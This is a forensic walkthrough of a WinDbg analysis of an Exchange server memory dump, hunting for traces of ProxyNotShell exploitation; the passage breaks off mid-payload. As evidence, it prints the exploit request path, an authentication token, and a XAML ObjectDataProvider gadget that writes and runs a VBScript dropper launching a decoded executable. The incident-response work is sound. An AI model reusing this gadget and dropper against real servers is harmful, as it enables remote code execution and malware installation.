00000268`99d3be62  626e263b 263b7073 7073626e 5c3a433b  ;&nbsp;&nbsp;C:\
00000268`99d3be72  676f7250 206d6172 656c6946 694d5c73  Program Files\Mi
00000268`99d3be82  736f7263 5c74666f 68637845 65676e61  crosoft\Exchange
00000268`99d3be92  72655320 5c726576 5c353156 65696c43   Server\V15\Clie
00000268`99d3bea2  6341746e 73736563 776f505c 68537265  ntAccess\PowerSh
00000268`99d3beb2  2d6c6c65 786f7250 2f3c5c79 3c3e6474  ell-Proxy\</td><
00000268`99d3bec2  3e72742f 20200a20 743c2020 6c632072  /tr> .    <tr cl

<<< SNIPPET >>>
```

# WinDbg Walk Through - Part 2

Load the second Memory Dump in WinDbg:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/fe13baa1-a550-4739-9cf8-5ba75571316c)


Let's start with the **`!mex.di`** command which stands for dump information. This command retrieves information about the machine from which the memory dump originated. It's especially handy when working with multiple memory dumps, as it helps distinguish the analysis related to each specific dump. This is an improved version of the **`vertarget`** command.

```
0:000> !mex.di
Computer Name: EXCHANGE
User Name: EXCHANGE$
PID: 0x27A4 = 0n10148
Windows 10 Version 17763 MP (2 procs) Free x64
Product: Server, suite: TerminalServer DataCenter SingleUserTS
Edition build lab: 17763.1.amd64fre.rs5_release.180914-1434
Debug session time: Mon Nov 20 06:41:35.000 2023 (UTC - 8:00)
System Uptime: 0 days 0:23:53.774
Process Uptime: 0 days 0:21:39.000
  Kernel time: 0 days 0:00:06.000
  User time: 0 days 0:00:17.000
```

Let's ensure that the memory dump is correct, since as discussed at the previous write-up. There are 14 IIS Worker Process managing a different Application Pool. The command **`!peb`** in WinDbg, with the **`!extensions/mex.dll.grep`** filtering for CommandLine, outputs the command line used to start the current process. In this case, it shows that an IIS worker process (w3wp.exe) was started for the application pool **MSExchangePowerShellAppPool**, which is indeed the correct one.

For analyzing ProxyNotShell, the application pool to dump is **MSExchangePowerShellAppPool**. This is because the vulnerabilities in ProxyNotShell, especially the remote code execution part, are exploited through the PowerShell backend, which is managed by the **MSExchangePowerShellAppPool**.

```
0:000> !extensions/mex.dll.grep CommandLine !peb
    CommandLine:  'c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangePowerShellAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm37649fe8-528b-4238-9e61-db22a7683bba -h "C:\inetpub\temp\apppools\MSExchangePowerShellAppPool\MSExchangePowerShellAppPool.config" -w "" -m 0'
```

We will start with running the **`!Mex.AspxPagesExt`** command which generates a report listing all current ASP.NET requests, including details such as address, completion status, timeouts, the time elapsed, thread IDs, return codes, HTTP verbs, and URLs for each request. 

As evident from the results, there is nothing of further interest to examine. Although the **`!Mex.AspxPagesExt`** command is useful, it unfortunately does not always reveal all the requests

```
0:000> !Mex.AspxPagesExt
 Address          Completed Timeout Time (secs) ThreadId ReturnCode Verb Url
 00000236cc4c2d58       yes     110                             200 POST /powershell?clientApplication=ActiveMonitor;PSVersion=5.1.17763.5122&sessionID=Version_15.2_(Build_1117.0)=rJqNiZqNgbqHnJeekZia0ZyQkYuQjJDRnJCSgc7Gy83OzcjIzs+Bzc/NzNLOztLNz6vOy8XKz8XKyA==
 00000236ccb05190       yes     110                             200 POST /powershell?clientApplication=ActiveMonitor
 00000236cd2df8e8       yes     110                             200 POST /powershell?clientApplication=ActiveMonitor
 00000236cd3a6ed8       yes     110                             401 POST /powershell?clientApplication=ActiveMonitor
 00000236cd3c4518       yes     110                             401 POST /powershell?clientApplication=ActiveMonitor
 00000236cd3ef578       yes     110                             200 POST /powershell?clientApplication=ActiveMonitor
 00000236cd405180       yes     110                             200 POST /powershell?clientApplication=ActiveMonitor
 00000236cd40af08       yes     110                             401 POST /powershell?clientApplication=ActiveMonitor
 00000236cd4aab90       yes     110                             401 POST /powershell?clientApplication=ActiveMonitor
 00000236cd4c7df0       yes     110                             200 POST /powershell?clientApplication=ActiveMonitor
10 contexts found (10 displayed).
   AS == possibly async request
   SL == session locked
```

We can use the **SOSEX** extension that has been created by **Steve Johnson**. The **SOSEX** extension is designed to enhance the analysis and troubleshooting of .NET applications. We can use the **`!sosex.strings`** to search for strings in a .NET application's managed heap.

```
0:000> !sosex.strings /m:"C:\Program Files\Microsoft\Exchange Server\V15\Logging\*"
Address            Gen  Value
---------------------------------------
00000236c9380fa0            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver
00000236c938c9f8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver\w3wp.exe_RemotePS_2023112014-3.LOG
00000236c94176e8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Calendar Repair Assistant
00000236c9418070            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Managed Folder Assistant
00000236c941b960            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\IRMLogs
00000236c962a808            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra
00000236c962a8a8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http
00000236c962a990            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\RequestMonitor
00000236c9679cf8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpRequestFiltering\
00000236c967ee80            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\RoutingUpdateModule\Powershell
00000236c96c7e18            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\Rps_Http_2023112014-1.LOG
00000236c9987d38            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra
00000236c9987dd8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\AuthZ
00000236ca02e8c8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver
00000236ca07b630            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver\w3wp.exe_RemotePS_2023112014-5.LOG
00000236cb685860            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\AuthZ\Rps_AuthZ_2023112014-1.LOG
00000236cb99b638            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet
00000236cb99ee90            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet\Rps_Cmdlet_2023112014-1.LOG
00000236cb9c4658            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\RoutingUpdateModule\Powershell\RoutingUpdateModule_2023112014-1.LOG
---------------------------------------
19 matching strings
```

We can run the following command to look for access to the PowerShell backend:

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "/PowerShell/,Kerberos,true" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "/PowerShell/,Kerberos,true" at ${address}; dc ${address} L100 } };
Found "/PowerShell/,Kerberos,true" at 00000236`c96ca55b
00000236`c96ca55b  776f502f 68537265 2f6c6c65 72654b2c  /PowerShell/,Ker
00000236`c96ca56b  6f726562 72742c73 612c6575 6e696d64  beros,true,admin
00000236`c96ca57b  322c2c2c 32322e30 31322e38 30322e30  ,,,20.228.210.20
00000236`c96ca58b  58452c30 4e414843 452c4547 41484358  0,EXCHANGE,EXCHA
00000236`c96ca59b  2e45474e 544e4f43 2e4f534f 2c4d4f43  NGE.CONTOSO.COM,
00000236`c96ca5ab  2c303032 2c2c2c30 2c2c2c2c 32312c2c  200,0,,,,,,,,,12
00000236`c96ca5bb  2c383331 4d205055 6c697a6f 352f616c  138,UP Mozilla/5
00000236`c96ca5cb  2820302e 646e6957 2073776f 3120544e  .0 (Windows NT 1
00000236`c96ca5db  3b302e30 6e695720 203b3436 29343678  0.0; Win64; x64)
00000236`c96ca5eb  70704120 6557656c 74694b62 3733352f   AppleWebKit/537
00000236`c96ca5fb  2036332e 54484b28 20204c4d 656b696c  .36 (KHTML  like
00000236`c96ca60b  63654720 20296f6b 6f726843 312f656d   Gecko) Chrome/1
00000236`c96ca61b  302e3830 302e302e 66615320 2f697261  08.0.0.0 Safari/
00000236`c96ca62b  2e373335 2c2c3633 382c382c 30253f2c  537.36,,,8,8,?%0
00000236`c96ca63b  32432541 25313925 43253430 31412533  A%C2%91%04%C3%A1
00000236`c96ca64b  43252f5f 31392533 25353225 43254130  _/%C3%91%25%0A%C
00000236`c96ca65b  31392532 25324325 43253539 30412532  2%91%C2%95%C2%A0
00000236`c96ca66b  25334325 43254438 38382533 3343253f  %C3%8D%C3%88?%C3
00000236`c96ca67b  25303825 39253343 33432531 25423825  %80%C3%91%C3%8B%
00000236`c96ca68b  38253343 43253f34 45382533 25334325  C3%84?%C3%8E%C3%
00000236`c96ca69b  43253138 41382533 2f373025 25334325  81%C3%8A%07/%C3%
00000236`c96ca6ab  43254438 38382533 3343253f 25303825  8D%C3%88?%C3%80%
00000236`c96ca6bb  39253343 33432531 25423825 38253343  C3%91%C3%8B%C3%8
00000236`c96ca6cb  43253f34 45382533 25334325 43253138  4?%C3%8E%C3%81%C
00000236`c96ca6db  41382533 25363025 41253243 33432536  3%8A%06%C2%A6%C3
00000236`c96ca6eb  3f423825 25453325 252f4131 43253532  %8B?%3E%1A/%25%C
00000236`c96ca6fb  30382533 25334325 33253138 30322545  3%80%C3%81%3E%20
00000236`c96ca70b  25324325 252f3641 38253343 43253f34  %C2%A6/%C3%84?%C
00000236`c96ca71b  32382533 25334325 30254238 43253a35  3%82%C3%8B%05:%C
00000236`c96ca72b  44382533 2f353225 25334325 43254438  3%8D%25/%C3%8D%C
00000236`c96ca73b  33382533 25363025 38253343 33432538  3%83%06%C3%88%C3
00000236`c96ca74b  25313825 38253343 33432542 2c383825  %81%C3%8B%C3%88,
00000236`c96ca75b  75716552 4d747365 74696e6f 522e726f  RequestMonitor.R
00000236`c96ca76b  73696765 3d726574 69573b30 444d526e  egister=0;WinRMD
00000236`c96ca77b  53617461 65646e65 65532e72 303d646e  ataSender.Send=0
00000236`c96ca78b  7370523b 70747448 61746144 65736162  ;RpsHttpDatabase
00000236`c96ca79b  696c6156 69746164 6f4d6e6f 656c7564  ValidationModule
00000236`c96ca7ab  543b303d 746f7268 6e696c74 74744867  =0;ThrottlingHtt
00000236`c96ca7bb  646f4d70 3d656c75 572c3b30 4d526e69  pModule=0;,WinRM
00000236`c96ca7cb  61746144 646e6553 412e7265 65687475  DataSender.Authe
00000236`c96ca7db  6369746e 6f697461 7079546e 65533d65  nticationType=Se
00000236`c96ca7eb  573b746e 4d526e69 61746144 646e6553  nt;WinRMDataSend
00000236`c96ca7fb  4e2e7265 64656d61 65706950 6e65533d  er.NamedPipe=Sen
00000236`c96ca80b  6e4f3b74 52646e45 65757165 452e7473  t;OnEndRequest.E
00000236`c96ca81b  432e646e 65746e6f 7954746e 613d6570  nd.ContentType=a
00000236`c96ca82b  696c7070 69746163 732f6e6f 2b70616f  pplication/soap+
00000236`c96ca83b  206c6d78 72616863 20746573 2d465455  xml charset UTF-
00000236`c96ca84b  3a533b38 76726553 43656369 6f6d6d6f  8;S:ServiceCommo
00000236`c96ca85b  74654d6e 74616461 74482e61 654d7074  nMetadata.HttpMe
00000236`c96ca86b  646f6874 534f503d 62443b54 4c573a6c  thod=POST;Dbl:WL
00000236`c96ca87b  53542e4d 493b383d 413a3233 432e4554  M.TS=8;I32:ATE.C
00000236`c96ca88b  3163645b 6e6f632e 6f736f74 6d6f632e  [dc1.contoso.com
00000236`c96ca89b  3b303d5d 54413a46 4c412e45 3163645b  ]=0;F:ATE.AL[dc1
00000236`c96ca8ab  6e6f632e 6f736f74 6d6f632e 3b303d5d  .contoso.com]=0;
00000236`c96ca8bb  3a323349 2e534441 63645b43 333d5d31  I32:ADS.C[dc1]=3
00000236`c96ca8cb  413a463b 412e5344 63645b4c 313d5d31  ;F:ADS.AL[dc1]=1
00000236`c96ca8db  3231372e 2c333335 30320a0d 312d3332  .712533,..2023-1
00000236`c96ca8eb  30322d31 3a343154 313a3533 35372e35  1-20T14:35:15.75
00000236`c96ca8fb  322c5a38 2d333230 322d3131 34315430  8Z,2023-11-20T14
00000236`c96ca90b  3a35333a 372e3531 2c5a3835 38386432  :35:15.758Z,2d88
00000236`c96ca91b  65663630 6236612d 39342d38 382d6162  06fe-a6b8-49ba-8
00000236`c96ca92b  2d653737 62653238 35343266 64303962  77e-82ebf245b90d
00000236`c96ca93b  2c35312c 31312c32 372c3831 78652c2c  ,15,2,1118,7,,ex
00000236`c96ca94b  6e616863 632e6567 6f746e6f 632e6f73  change.contoso.c

<<< SNIPPET >>>
```

This log entry contains an URL-encoded string in a PowerShell-related HTTP request, which we saw previously as well.

```
%0A%C2%91%04%C3%A1_/%C3%91%25%0A%C2%91%C2%95%C2%A0%C3%8D%C3%88?%C3%80%C3%91%C3%8B%C3%84?%C3%8E%C3%81%C3%8A%07/%C3%8D%C3%88?%C3%80%C3%91%C3%8B%C3%84?%C3%8E%C3%81%C
```

This command searches through memory for a specific ProxyNotShell related string **`("/PowerShell/?%17Email%15Autodiscover/autodiscover.json?")`**, and for each occurrence found, it checks if it matches a certain pattern and then outputs the content starting from that address. This pattern is matching ProxyNotShell.

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "/PowerShell/?%17Email%15Autodiscover/autodiscover.json?" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "//PowerShell/?%17Email%15Autodiscover/autodiscover.json?" at ${address}; dc ${address} L100 } };
Found "//PowerShell/?%17Email%15Autodiscover/autodiscover.json?" at 00000236`e468bb88
00000236`e468bb88  776f502f 68537265 2f6c6c65 3731253f  /PowerShell/?%17
00000236`e468bb98  69616d45 3531256c 6f747541 63736964  Email%15Autodisc
00000236`e468bba8  7265766f 7475612f 7369646f 65766f63  over/autodiscove
00000236`e468bbb8  736a2e72 613f6e6f 6e65646c 63616a40  r.json?alden@jac
00000236`e468bbc8  2d73626f 616c757a 742e6675 00747365  obs-zulauf.test.
00000236`e468bbd8  6f67654e 74616974 49592065 67434849  Negotiate YIIHCg
00000236`e468bbe8  6f4b4a59 7668495a 51415363 51414349  YJKoZIhvcSAQICAQ
00000236`e468bbf8  67677542 494d3562 61394749 67414441  Buggb5MIIG9aADAg
00000236`e468bc08  516f4645 5141434d 77426936 4341464d  EFoQMCAQ6iBwMFAC
00000236`e468bc18  41414141 67676a43 59597155 6a4a4649  AAAACjggUqYYIFJj
00000236`e468bc28  53424343 7741674b 61424249 77474e45  CCBSKgAwIBBaENGw
00000236`e468bc38  30544474 31545535 6b4c504e 6154504e  tDT05UT1NPLkNPTa
00000236`e468bc48  434d6e49 77416757 71414249 424d6545  InMCWgAwIBAqEeMB
00000236`e468bc58  45426277 46565568 47466241 32593456  wbBEhUVFAbFGV4Y2
00000236`e468bc68  6d626868 6d4c6c64 6e62764e 32637652  hhbmdlLmNvbnRvc2
00000236`e468bc78  32597538 346f7439 54344549 4e424343  8uY29to4IE4TCCBN
00000236`e468bc88  77416732 71454249 67414445 6f6f4245  2gAwIBEqEDAgEBoo
00000236`e468bc98  777a4549 4d424353 50414a74 416e7665  IEzwSCBMtJAPevnA
00000236`e468bca8  71337565 7a34516a 72334241 654f7a73  eu3qjQ4zAB3rszOe
00000236`e468bcb8  37365058 39727966 43453353 7962742f  XP67fyr9S3EC/tby
00000236`e468bcc8  6835355a 67776a4f 6a6d4c64 45533635  Z55hOjwgdLmj56SE
00000236`e468bcd8  7a646737 2b655633 384e454e 6d393976  7gdz3Ve+NEN8v99m
00000236`e468bce8  35334832 45325472 42476938 526d2b32  2H35rT2E8iGB2+mR
00000236`e468bcf8  57524241 4845454b 752f4a6b 5a774655  ABRWKEEHkJ/uUFwZ
00000236`e468bd08  56526657 447a3470 345a6532 556e6e37  WfRVp4zD2eZ47nnU
00000236`e468bd18  336c456b 71317766 3563715a 4e775068  kEl3fw1qZqc5hPwN
00000236`e468bd28  676b7251 6c416644 4439684c 436f3645  QrkgDfAlLh9DE6oC
00000236`e468bd38  624f4b53 5332712b 42613768 52595a7a  SKOb+q2Sh7aBzZYR
00000236`e468bd48  3568434d 36445952 426a2f6c 386c5174  MCh5RYD6l/jBtQl8
00000236`e468bd58  587a5a56 46304a63 65683452 6b517a6a  VZzXcJ0FR4hejzQk
00000236`e468bd68  304a4f77 42754251 5268396d 664d3366  wOJ0QBuBm9hRf3Mf
00000236`e468bd78  4b337841 6e563659 6f57566e 6f732b79  Ax3KY6VnnVWoy+so
00000236`e468bd88  55546c4d 4a656274 7054317a 54775a65  MlTUtbeJz1TpeZwT
00000236`e468bd98  6242694d 69483549 50714b2f 46473369  MiBbI5Hi/KqPi3GF
00000236`e468bda8  6450394a 4a736846 77775830 6a743643  J9PdFhsJ0XwwC6tj
00000236`e468bdb8  50577947 394c4b63 71434279 39397349  GyWPcKL9yBCqIs99
00000236`e468bdc8  4a2b4848 572b7856 7343517a 34326a73  HH+JVx+WzQCssj24
00000236`e468bdd8  74726745 72595a39 59563867 59796a77  Egrt9ZYrg8VYwjyY
00000236`e468bde8  4a71456e 52447a68 45414554 4c516c4c  nEqJhzDRTEAELlQL
00000236`e468bdf8  734c6b62 356d6a45 6a624564 424b6867  bkLsEjm5dEbjghKB
00000236`e468be08  6b506632 6e574730 5259585a 43775966  2fPk0GWnZXYRfYwC
00000236`e468be18  4a6b7379 2f30436c 4d6d4c31 2f377730  yskJlC0/1LmM0w7/
00000236`e468be28  5578566c 5a536a59 4a513255 5a587a6f  lVxUYjSZU2QJozXZ
00000236`e468be38  57524765 68665637 586f4144 52616439  eGRW7VfhDAoX9daR
00000236`e468be48  7a475367 56467476 396a6645 5771446d  gSGzvtFVEfj9mDqW
00000236`e468be58  66417538 2b68696a 476e6945 62715161  8uAfjih+EinGaQqb
00000236`e468be68  416d662f 3243422b 54474475 33424452  /fmA+BC2uDGTRDB3
00000236`e468be78  42385559 65564a61 55526373 41686341  YU8BaJVescRUAchA
00000236`e468be88  46436554 4932324f 62677a59 38386b79  TeCFO22IYzgbyk88
00000236`e468be98  4e6e4867 6f73724f 43554236 6955794a  gHnNOrso6BUCJyUi
00000236`e468bea8  4e485530 34366c62 4733626d 79586e6f  0UHNbl64mb3GonXy
00000236`e468beb8  574f4d78 714c7530 64624457 68524475  xMOW0uLqWDbduDRh
00000236`e468bec8  58392b46 69506c37 3643702b 44375649  F+9X7lPi+pC6IV7D
00000236`e468bed8  4f62594d 57497533 46673962 59362f49  MYbO3uIWb9gFI/6Y
00000236`e468bee8  64326144 48427276 6f6f4b73 3336444f  Da2dvrBHsKooOD63
00000236`e468bef8  45553153 44355174 32626f71 69593267  S1UEtQ5Dqob2g2Yi
00000236`e468bf08  46777646 554e5944 47794641 3530344e  FvwFDYNUAFyGN405
00000236`e468bf18  456d7634 57546935 6d376352 396f7462  4vmE5iTWRc7mbto9
00000236`e468bf28  72665977 76493649 6e486631 47485457  wYfrI6Iv1fHnWTHG
00000236`e468bf38  66363331 65394147 52615868 43387238  136fGA9ehXaR8r8C
00000236`e468bf48  4f584348 5a545376 75305947 38557a6a  HCXOvSTZGY0ujzU8
00000236`e468bf58  6b656a6d 434e6645 4943316f 5a34384a  mjekEfNCo1CIJ84Z
00000236`e468bf68  52705a4d 554d2f65 7a6f5364 5a335854  MZpRe/MUdSozTX3Z
00000236`e468bf78  66706a4d 79336c47 5130657a 4c2b565a  MjpfGl3yze0QZV+L
```


The command **`db 00000236e468bb88-100 l200`** retrieves and shows 200 bytes of memory data, starting 256 bytes before the address **`00000236e468bb88`**, to provide insights into the specified memory location. Here we can see the ProxyNotShell request:

```
0:000> db 00000236`e468bb88-100 l200
00000236`e468ba88  02 00 20 ad 0a 64 0a 05-00 00 00 00 00 00 00 00  .. ..d..........
00000236`e468ba98  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00000236`e468baa8  68 00 74 00 74 00 70 00-73 00 3a 00 2f 00 2f 00  h.t.t.p.s.:././.
00000236`e468bab8  65 00 78 00 63 00 68 00-61 00 6e 00 67 00 65 00  e.x.c.h.a.n.g.e.
00000236`e468bac8  2e 00 63 00 6f 00 6e 00-74 00 6f 00 73 00 6f 00  ..c.o.n.t.o.s.o.
00000236`e468bad8  2e 00 63 00 6f 00 6d 00-3a 00 34 00 34 00 34 00  ..c.o.m.:.4.4.4.
00000236`e468bae8  2f 00 50 00 6f 00 77 00-65 00 72 00 53 00 68 00  /.P.o.w.e.r.S.h.
00000236`e468baf8  65 00 6c 00 6c 00 2f 00-3f 00 25 00 31 00 37 00  e.l.l./.?.%.1.7.
00000236`e468bb08  45 00 6d 00 61 00 69 00-6c 00 25 00 31 00 35 00  E.m.a.i.l.%.1.5.
00000236`e468bb18  41 00 75 00 74 00 6f 00-64 00 69 00 73 00 63 00  A.u.t.o.d.i.s.c.
00000236`e468bb28  6f 00 76 00 65 00 72 00-2f 00 61 00 75 00 74 00  o.v.e.r./.a.u.t.
00000236`e468bb38  6f 00 64 00 69 00 73 00-63 00 6f 00 76 00 65 00  o.d.i.s.c.o.v.e.
00000236`e468bb48  72 00 2e 00 6a 00 73 00-6f 00 6e 00 3f 00 61 00  r...j.s.o.n.?.a.
00000236`e468bb58  6c 00 64 00 65 00 6e 00-40 00 6a 00 61 00 63 00  l.d.e.n.@.j.a.c.
00000236`e468bb68  6f 00 62 00 73 00 2d 00-7a 00 75 00 6c 00 61 00  o.b.s.-.z.u.l.a.
00000236`e468bb78  75 00 66 00 2e 00 74 00-65 00 73 00 74 00 00 00  u.f...t.e.s.t...
00000236`e468bb88  2f 50 6f 77 65 72 53 68-65 6c 6c 2f 3f 25 31 37  /PowerShell/?%17
00000236`e468bb98  45 6d 61 69 6c 25 31 35-41 75 74 6f 64 69 73 63  Email%15Autodisc
00000236`e468bba8  6f 76 65 72 2f 61 75 74-6f 64 69 73 63 6f 76 65  over/autodiscove
00000236`e468bbb8  72 2e 6a 73 6f 6e 3f 61-6c 64 65 6e 40 6a 61 63  r.json?alden@jac
00000236`e468bbc8  6f 62 73 2d 7a 75 6c 61-75 66 2e 74 65 73 74 00  obs-zulauf.test.
00000236`e468bbd8  4e 65 67 6f 74 69 61 74-65 20 59 49 49 48 43 67  Negotiate YIIHCg
00000236`e468bbe8  59 4a 4b 6f 5a 49 68 76-63 53 41 51 49 43 41 51  YJKoZIhvcSAQICAQ
00000236`e468bbf8  42 75 67 67 62 35 4d 49-49 47 39 61 41 44 41 67  Buggb5MIIG9aADAg
00000236`e468bc08  45 46 6f 51 4d 43 41 51-36 69 42 77 4d 46 41 43  EFoQMCAQ6iBwMFAC
00000236`e468bc18  41 41 41 41 43 6a 67 67-55 71 59 59 49 46 4a 6a  AAAACjggUqYYIFJj
00000236`e468bc28  43 43 42 53 4b 67 41 77-49 42 42 61 45 4e 47 77  CCBSKgAwIBBaENGw
00000236`e468bc38  74 44 54 30 35 55 54 31-4e 50 4c 6b 4e 50 54 61  tDT05UT1NPLkNPTa
00000236`e468bc48  49 6e 4d 43 57 67 41 77-49 42 41 71 45 65 4d 42  InMCWgAwIBAqEeMB
00000236`e468bc58  77 62 42 45 68 55 56 46-41 62 46 47 56 34 59 32  wbBEhUVFAbFGV4Y2
00000236`e468bc68  68 68 62 6d 64 6c 4c 6d-4e 76 62 6e 52 76 63 32  hhbmdlLmNvbnRvc2
00000236`e468bc78  38 75 59 32 39 74 6f 34-49 45 34 54 43 43 42 4e  8uY29to4IE4TCCBN
```


We utilized the **`!sosex.strings`** command to search for specific strings on the .NET managed heap. Initially, while exploring various strings, I discovered something intriguing and chose to focus on the string **`ObjectDataProvider`**. This string refers to a WPF and XAML class in .NET applications, designed for data binding and enabling dynamic method invocation on objects in XAML-based interfaces.

This search let to five results, with a suspicious entry located at the memory address **`00000236cbcad640`**.

```
0:000> !sosex.strings /m:*ObjectDataProvider*
Address            Gen  Value
---------------------------------------
00000236cbc20b98            2   System.Windows.Data.ObjectDataProvider
00000236cbc7e6b0            2   ObjectDataProviderHasNoSource
00000236cbc7e858            2   ObjectDataProviderNonCLSException
00000236cbc7ee08            2   ObjectDataProviderNonCLSExceptionInvoke
00000236cbcad640            2   <ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
  <ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
    <ObjectDataProvider.MethodParameters>
      <System:String>cmd.exe</System:String>
      <System:String>/c echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATkIxMAAAAAA2gMFKAQAAAEM6XGxvY2FsMFxhc2ZccmVsZWFzZVxidWlsZC0yLjIuMTRcc3VwcG9ydFxSZWxlYXNlXGFiLnBkYgA=&gt;&gt;%TEMP%\MgjAb.b64 &amp; echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set file = fs.GetFile("%TEMP%\MgjAb.b64") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If file.Size Then &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set fd = fs.OpenTextFile("%TEMP%\MgjAb.b64", 1) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo data = fd.ReadAll &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo data = Replace(data, vbCrLf, "") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo data = base64_decode(data) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo fd.Close &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("%TEMP%\GXBQG.exe", 2, True) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo ofs.Write data &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo ofs.close &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set shell = CreateObject("Wscript.Shell") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo shell.run "%TEMP%\GXBQG.exe", 0, false &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Else &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Wscript.Echo "The file is empty." &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End If &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Function base64_decode(byVal strIn) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Dim w1, w2, w3, w4, n, strOut &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo For n = 1 To Len(strIn) Step 4 &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w1 = mimedecode(Mid(strIn, n, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w2 = mimedecode(Mid(strIn, n + 1, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w3 = mimedecode(Mid(strIn, n + 2, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w4 = mimedecode(Mid(strIn, n + 3, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If Not w2 Then _ &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If  Not w3 Then _ &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 